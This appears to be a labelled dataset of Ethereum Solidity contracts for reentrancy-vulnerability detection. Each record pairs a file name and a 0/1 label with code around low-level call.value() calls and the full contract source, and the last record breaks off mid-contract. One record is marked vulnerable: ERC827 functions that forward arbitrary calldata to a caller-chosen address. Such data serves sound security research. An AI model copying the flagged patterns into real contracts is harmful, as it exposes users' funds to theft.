{"sol name": "40416.sol", "label": 0, "first path": "function withdraw(uint amount) { if (msg.value>0) throw; if (tokens[0][msg.sender] < amount) throw; tokens[0][msg.sender] -= amount; if (!msg.sender.call.value(amount)()) throw; Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "second path": "function withdraw(uint amount) { if (msg.value>0) throw; if (tokens[0][msg.sender] < amount) throw; tokens[0][msg.sender] -= amount; if (!msg.sender.call.value(amount)()) throw; Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "third path": "function withdraw(uint amount) { if (msg.value>0) throw; if (tokens[0][msg.sender] < amount) throw; tokens[0][msg.sender] -= amount; if (!msg.sender.call.value(amount)()) throw; Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); ", "long path": "contract Token { function totalSupply() constant returns (uint256 supply) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balancesVersions[version].balances[msg.sender] >= _value && balancesVersions[version].balances[_to] + _value > balancesVersions[version].balances[_to]) { balancesVersions[version].balances[msg.sender] -= _value; balancesVersions[version].balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balancesVersions[version].balances[_from] >= _value && allowedVersions[version].allowed[_from][msg.sender] >= _value && balancesVersions[version].balances[_to] + _value > balancesVersions[version].balances[_to]) { balancesVersions[version].balances[_to] += _value; balancesVersions[version].balances[_from] -= _value; allowedVersions[version].allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balancesVersions[version].balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowedVersions[version].allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowedVersions[version].allowed[_owner][_spender]; } uint public version = 0; struct BalanceStruct { mapping(address => uint256) balances; } mapping(uint => BalanceStruct) balancesVersions; struct AllowedStruct { mapping (address => mapping (address => uint256)) allowed; } mapping(uint => AllowedStruct) allowedVersions; uint256 public totalSupply; } contract ReserveToken is StandardToken { address public minter; function setMinter() { if (minter==0x0000000000000000000000000000000000000000) { minter = msg.sender; } } modifier onlyMinter { if (msg.sender == minter) _; } function create(address account, uint amount) onlyMinter { balancesVersions[version].balances[account] += amount; totalSupply += amount; } function destroy(address account, uint amount) onlyMinter { if (balancesVersions[version].balances[account] < amount) throw; balancesVersions[version].balances[account] -= amount; totalSupply -= amount; } function reset() onlyMinter { version++; totalSupply = 0; } } contract EtherDelta { mapping (address => mapping (address => uint)) tokens; mapping (bytes32 => uint) orderFills; address public feeAccount; uint public feeMake; uint public feeTake; event Order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s); event Trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address get, address give); event Deposit(address token, address user, uint amount, uint balance); event Withdraw(address token, address user, uint amount, uint balance); function EtherDelta(address feeAccount_, uint feeMake_, uint feeTake_) { feeAccount = feeAccount_; feeMake = feeMake_; feeTake = feeTake_; } function() { throw; } function deposit() { tokens[0][msg.sender] += msg.value; Deposit(0, msg.sender, msg.value, tokens[0][msg.sender]); } function withdraw(uint amount) { if (msg.value>0) throw; if (tokens[0][msg.sender] < amount) throw; tokens[0][msg.sender] -= amount; if (!msg.sender.call.value(amount)()) throw; Withdraw(0, msg.sender, amount, tokens[0][msg.sender]); } function depositToken(address token, uint amount) { if (msg.value>0 || token==0) throw; if (!Token(token).transferFrom(msg.sender, this, amount)) throw; tokens[token][msg.sender] += amount; Deposit(token, msg.sender, amount, tokens[token][msg.sender]); } function withdrawToken(address token, uint amount) { if (msg.value>0 || token==0) throw; if (tokens[token][msg.sender] < amount) throw; tokens[token][msg.sender] -= amount; if (!Token(token).transfer(msg.sender, amount)) throw; Withdraw(token, msg.sender, amount, tokens[token][msg.sender]); } function balanceOf(address token, address user) constant returns (uint) { return tokens[token][user]; } function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s) { if (msg.value>0) throw; Order(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, msg.sender, v, r, s); } function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount) { if (msg.value>0) throw; bytes32 hash = sha256(tokenGet, amountGet, tokenGive, amountGive, expires, nonce); if (!( ecrecover(hash,v,r,s) == user && block.number <= expires && orderFills[hash] + amount <= amountGet && tokens[tokenGet][msg.sender] >= amount && tokens[tokenGive][user] >= amountGive * amount / amountGet )) throw; tokens[tokenGet][msg.sender] -= amount; tokens[tokenGet][user] += amount * ((1 ether) - feeMake) / (1 ether); tokens[tokenGet][feeAccount] += amount * feeMake / (1 ether); tokens[tokenGive][user] -= amountGive * amount / amountGet; tokens[tokenGive][msg.sender] += ((1 ether) - feeTake) * amountGive * amount / amountGet / (1 ether); tokens[tokenGive][feeAccount] += feeTake * amountGive * amount / amountGet / (1 ether); orderFills[hash] += amount; Trade(tokenGet, amount, tokenGive, amountGive * amount / amountGet, user, msg.sender); } function testTrade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount, address sender) constant returns(bool) { if (!( tokens[tokenGet][sender] >= amount && availableVolume(tokenGet, amountGet, tokenGive, amountGive, expires, nonce, user, v, r, s) >= amount )) return false; return true; } function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint) { bytes32 hash = sha256(tokenGet, amountGet, tokenGive, amountGive, expires, nonce); if (!( ecrecover(hash,v,r,s) == user && block.number <= expires )) return 0; uint available1 = amountGet - orderFills[hash]; uint available2 = tokens[tokenGive][user] * amountGet / amountGive; if (available1<available2) return available1; return available2; } } "}
{"sol name": "37329.sol", "label": 0, "first path": "function buyICO() onlyExecutorOrOwner { if (getBlockNumber() < icoStartBlock) return; if (this.balance == 0) return; uint256 purchaseAmount = Math.min256(this.balance, purchaseCap); assert(crowdSale.call.value(purchaseAmount)()); ICOPurchased(purchaseAmount); ", "second path": "function buyICO() onlyExecutorOrOwner { if (getBlockNumber() < icoStartBlock) return; if (this.balance == 0) return; uint256 purchaseAmount = Math.min256(this.balance, purchaseCap); assert(crowdSale.call.value(purchaseAmount)()); ICOPurchased(purchaseAmount); ", "third path": "function buyICO() onlyExecutorOrOwner { if (getBlockNumber() < icoStartBlock) return; if (this.balance == 0) return; uint256 purchaseAmount = Math.min256(this.balance, purchaseCap); assert(crowdSale.call.value(purchaseAmount)()); ICOPurchased(purchaseAmount); ", "long path": "pragma solidity ^0.4.11; library Math { function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } } contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) constant returns (uint256); function transfer(address to, uint256 value) returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } } contract ICOBuyer is Ownable { event EtherReceived(address indexed _contributor, uint256 _amount); event EtherWithdrawn(uint256 _amount); event TokensWithdrawn(uint256 _balance); event ICOPurchased(uint256 _amount); event ICOStartBlockChanged(uint256 _icoStartBlock); event ExecutorChanged(address _executor); event CrowdSaleChanged(address _crowdSale); event TokenChanged(address _token); event PurchaseCapChanged(uint256 _purchaseCap); uint256 public icoStartBlock; address public crowdSale; address public executor; uint256 public purchaseCap; modifier onlyExecutorOrOwner() { require((msg.sender == executor) || (msg.sender == owner)); _; } function ICOBuyer(address _executor, address _crowdSale, uint256 _icoStartBlock, uint256 _purchaseCap) { executor = _executor; crowdSale = _crowdSale; icoStartBlock = _icoStartBlock; purchaseCap = _purchaseCap; } function changeCrowdSale(address _crowdSale) onlyOwner { crowdSale = _crowdSale; CrowdSaleChanged(crowdSale); } function changeICOStartBlock(uint256 _icoStartBlock) onlyOwner { icoStartBlock = _icoStartBlock; ICOStartBlockChanged(icoStartBlock); } function changePurchaseCap(uint256 _purchaseCap) onlyOwner { purchaseCap = _purchaseCap; PurchaseCapChanged(purchaseCap); } function changeExecutor(address _executor) onlyOwner { executor = _executor; ExecutorChanged(_executor); } function withdrawEther() onlyOwner { require(this.balance != 0); owner.transfer(this.balance); EtherWithdrawn(this.balance); } function withdrawTokens(address _token) onlyOwner { ERC20Basic token = ERC20Basic(_token); uint256 contractTokenBalance = token.balanceOf(address(this)); require(contractTokenBalance != 0); assert(token.transfer(owner, contractTokenBalance)); TokensWithdrawn(contractTokenBalance); } function buyICO() onlyExecutorOrOwner { if (getBlockNumber() < icoStartBlock) return; if (this.balance == 0) return; uint256 purchaseAmount = Math.min256(this.balance, purchaseCap); assert(crowdSale.call.value(purchaseAmount)()); ICOPurchased(purchaseAmount); } function () payable { EtherReceived(msg.sender, msg.value); } function getBlockNumber() internal constant returns (uint256) { return block.number; } } "}
{"sol name": "13076.sol", "label": 1, "first path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract TimedCrowdsale is Crowdsale { using SafeMath for uint256; uint256 public openingTime; uint256 public closingTime; modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; ", "second path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract TimedCrowdsale is Crowdsale { using SafeMath for uint256; uint256 public openingTime; uint256 public closingTime; modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; ", "third path": "function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract TimedCrowdsale is Crowdsale { using SafeMath for uint256; uint256 public openingTime; uint256 public closingTime; modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; ", "long path": "pragma solidity ^0.4.13; contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract Crowdsale { using SafeMath for uint256; ERC20 public token; address public wallet; uint256 public rate; uint256 public weiRaised; event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount); function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public { require(_rate > 0); require(_wallet != address(0)); require(_token != address(0)); rate = _rate; wallet = _wallet; token = _token; } function () external payable { buyTokens(msg.sender); } function buyTokens(address _beneficiary) public payable { uint256 weiAmount = msg.value; _preValidatePurchase(_beneficiary, weiAmount); uint256 tokens = _getTokenAmount(weiAmount); weiRaised = weiRaised.add(weiAmount); _processPurchase(_beneficiary, tokens); emit TokenPurchase( msg.sender, _beneficiary, weiAmount, tokens ); _updatePurchasingState(_beneficiary, weiAmount); _forwardFunds(); _postValidatePurchase(_beneficiary, weiAmount); } function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal { require(_beneficiary != address(0)); require(_weiAmount != 0); } function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal { } function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal { token.transfer(_beneficiary, _tokenAmount); } function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal { _deliverTokens(_beneficiary, _tokenAmount); } function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal { } function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) { return _weiAmount.mul(rate); } function _forwardFunds() internal { wallet.transfer(msg.value); } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract ERC827 is ERC20 { function approveAndCall( address _spender, uint256 _value, bytes _data) public payable returns (bool); function transferAndCall( address _to, uint256 _value, bytes _data) public payable returns (bool); function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public    payable    returns (bool);} library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract CappedCrowdsale is Crowdsale { using SafeMath for uint256; uint256 public cap; function CappedCrowdsale(uint256 _cap) public { require(_cap > 0); cap = _cap; } function capReached() public view returns (bool) { return weiRaised >= cap; } function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal { super._preValidatePurchase(_beneficiary, _weiAmount); require(weiRaised.add(_weiAmount) <= cap); } } contract Certifier { event Confirmed(address indexed who); event Revoked(address indexed who); function certified(address) public constant returns (bool); function get(address, string) public constant returns (bytes32); function getAddress(address, string) public constant returns (address); function getUint(address, string) public constant returns (uint); } contract Certifiable is Ownable { Certifier public certifier; event CertifierChanged(address indexed newCertifier); constructor(address _certifier) public { certifier = Certifier(_certifier); } function updateCertifier(address _address) public onlyOwner returns (bool success) { require(_address != address(0)); emit CertifierChanged(_address); certifier = Certifier(_address); return true; } } contract KYCToken is Certifiable { mapping(address => bool) public kycPending; mapping(address => bool) public managers; event ManagerAdded(address indexed newManager); event ManagerRemoved(address indexed removedManager); modifier onlyManager() { require(managers[msg.sender] == true); _; } modifier isKnownCustomer(address _address) { require(!kycPending[_address] || certifier.certified(_address)); if (kycPending[_address]) { kycPending[_address] = false; } _; } constructor(address _certifier) public Certifiable(_certifier) { } function addManager(address _address) external onlyOwner { managers[_address] = true; emit ManagerAdded(_address); } function removeManager(address _address) external onlyOwner { managers[_address] = false; emit ManagerRemoved(_address); } } contract AllowanceCrowdsale is Crowdsale { using SafeMath for uint256; address public tokenWallet; function AllowanceCrowdsale(address _tokenWallet) public { require(_tokenWallet != address(0)); tokenWallet = _tokenWallet; } function remainingTokens() public view returns (uint256) { return token.allowance(tokenWallet, this); } function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal { token.transferFrom(tokenWallet, _beneficiary, _tokenAmount); } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } } contract BurnableToken is BasicToken { event Burn(address indexed burner, uint256 value); function burn(uint256 _value) public { _burn(msg.sender, _value); } function _burn(address _who, uint256 _value) internal { require(_value <= balances[_who]); balances[_who] = balances[_who].sub(_value); totalSupply_ = totalSupply_.sub(_value); emit Burn(_who, _value); emit Transfer(_who, address(0), _value); } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract ERC827Token is ERC827, StandardToken { function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; } function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; } function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; } function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; } function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; } } contract TimedCrowdsale is Crowdsale { using SafeMath for uint256; uint256 public openingTime; uint256 public closingTime; modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; } function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public { require(_openingTime >= block.timestamp); require(_closingTime >= _openingTime); openingTime = _openingTime; closingTime = _closingTime; } function hasClosed() public view returns (bool) { return block.timestamp > closingTime; } function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen { super._preValidatePurchase(_beneficiary, _weiAmount); } } contract EDUCrowdsale is AllowanceCrowdsale, CappedCrowdsale, TimedCrowdsale, Ownable, Certifiable { using SafeMath for uint256; uint256 constant FIFTY_ETH = 50 * (10 ** 18); uint256 constant HUNDRED_AND_FIFTY_ETH = 150 * (10 ** 18); uint256 constant TWO_HUNDRED_AND_FIFTY_ETH = 250 * (10 ** 18); EDUToken public token; event TokenWalletChanged(address indexed newTokenWallet); event WalletChanged(address indexed newWallet); constructor( address _wallet, EDUToken _token, address _tokenWallet, uint256 _cap, uint256 _openingTime, uint256 _closingTime, address _certifier ) public Crowdsale(getCurrentRate(), _wallet, _token) AllowanceCrowdsale(_tokenWallet) CappedCrowdsale(_cap) TimedCrowdsale(_openingTime, _closingTime) Certifiable(_certifier) { token = _token; } function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal { if (certifier.certified(_beneficiary)) { token.transferFrom(tokenWallet, _beneficiary, _tokenAmount); } else { token.delayedTransferFrom(tokenWallet, _beneficiary, _tokenAmount); } } function getCurrentRate() public view returns (uint256) { if (block.timestamp < 1528156799) { return 1050; } else if (block.timestamp < 1528718400) { return 940; } else if (block.timestamp < 1529323200) { return 865; } else if (block.timestamp < 1529928000) { return 790; } else { return 750; } } function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) { uint256 currentRate = getCurrentRate(); uint256 volumeBonus = _getVolumeBonus(currentRate, _weiAmount); return currentRate.mul(_weiAmount).add(volumeBonus); } function _getVolumeBonus(uint256 _currentRate, uint256 _weiAmount) internal view returns (uint256) { if (_weiAmount >= FIFTY_ETH) { if (_weiAmount >= HUNDRED_AND_FIFTY_ETH) { if (_weiAmount >= TWO_HUNDRED_AND_FIFTY_ETH) { return _currentRate.mul(_weiAmount).mul(15).div(100); } return _currentRate.mul(_weiAmount).mul(10).div(100); } return _currentRate.mul(_weiAmount).mul(5).div(100); } return 0; } function changeTokenWallet(address _tokenWallet) external onlyOwner { require(_tokenWallet != address(0x0)); tokenWallet = _tokenWallet; emit TokenWalletChanged(_tokenWallet); } function changeWallet(address _wallet) external onlyOwner { require(_wallet != address(0x0)); wallet = _wallet; emit WalletChanged(_wallet); } } contract EDUToken is BurnableToken, KYCToken, ERC827Token { using SafeMath for uint256; string public constant name = \"EDU Token\"; string public constant symbol = \"EDU\"; uint8 public constant decimals = 18; uint256 public constant INITIAL_SUPPLY = 48000000 * (10 ** uint256(decimals)); constructor(address _certifier) public KYCToken(_certifier) { totalSupply_ = INITIAL_SUPPLY; balances[msg.sender] = INITIAL_SUPPLY; emit Transfer(0x0, msg.sender, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) public isKnownCustomer(msg.sender) returns (bool) { return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public isKnownCustomer(_from) returns (bool) { return super.transferFrom(_from, _to, _value); } function approve(address _spender, uint256 _value) public isKnownCustomer(_spender) returns (bool) { return super.approve(_spender, _value); } function increaseApproval(address _spender, uint _addedValue) public isKnownCustomer(_spender) returns (bool success) { return super.increaseApproval(_spender, _addedValue); } function decreaseApproval(address _spender, uint _subtractedValue) public isKnownCustomer(_spender) returns (bool success) { return super.decreaseApproval(_spender, _subtractedValue); } function delayedTransferFrom(address _tokenWallet, address _to, uint256 _value) public onlyManager returns (bool) { transferFrom(_tokenWallet, _to, _value); kycPending[_to] = true; } } "}
{"sol name": "39890.sol", "label": 0, "first path": "function authorizePayment(uint _idMilestone) internal { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw; milestone.status = MilestoneStatus.AuthorizedForPayment; if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw; ProposalStatusChanged(_idMilestone, milestone.status); function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw; if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw; authorizePayment(_idMilestone); function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); ", "second path": "function authorizePayment(uint _idMilestone) internal { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw; milestone.status = MilestoneStatus.AuthorizedForPayment; if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw; ProposalStatusChanged(_idMilestone, milestone.status); function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw; if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw; authorizePayment(_idMilestone); function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); ", "third path": "function authorizePayment(uint _idMilestone) internal { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw; milestone.status = MilestoneStatus.AuthorizedForPayment; if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw; ProposalStatusChanged(_idMilestone, milestone.status); function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw; if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw; authorizePayment(_idMilestone); function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging { if (_idMilestone >= milestones.length) throw; Milestone milestone = milestones[_idMilestone]; if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw; authorizePayment(_idMilestone); ", "long path": "pragma solidity ^0.4.6; library RLP { uint constant DATA_SHORT_START = 0x80; uint constant DATA_LONG_START = 0xB8; uint constant LIST_SHORT_START = 0xC0; uint constant LIST_LONG_START = 0xF8; uint constant DATA_LONG_OFFSET = 0xB7; uint constant LIST_LONG_OFFSET = 0xF7; struct RLPItem { uint _unsafe_memPtr; uint _unsafe_length; } struct Iterator { RLPItem _unsafe_item; uint _unsafe_nextPtr; } function next(Iterator memory self) internal constant returns (RLPItem memory subItem) { if(hasNext(self)) { var ptr = self._unsafe_nextPtr; var itemLength = _itemLength(ptr); subItem._unsafe_memPtr = ptr; subItem._unsafe_length = itemLength; self._unsafe_nextPtr = ptr + itemLength; } else throw; } function next(Iterator memory self, bool strict) internal constant returns (RLPItem memory subItem) { subItem = next(self); if(strict && !_validate(subItem)) throw; return; } function hasNext(Iterator memory self) internal constant returns (bool) { var item = self._unsafe_item; return self._unsafe_nextPtr < item._unsafe_memPtr + item._unsafe_length; } function toRLPItem(bytes memory self) internal constant returns (RLPItem memory) { uint len = self.length; if (len == 0) { return RLPItem(0, 0); } uint memPtr; assembly { memPtr := add(self, 0x20) } return RLPItem(memPtr, len); } function toRLPItem(bytes memory self, bool strict) internal constant returns (RLPItem memory) { var item = toRLPItem(self); if(strict) { uint len = self.length; if(_payloadOffset(item) > len) throw; if(_itemLength(item._unsafe_memPtr) != len) throw; if(!_validate(item)) throw; } return item; } function isNull(RLPItem 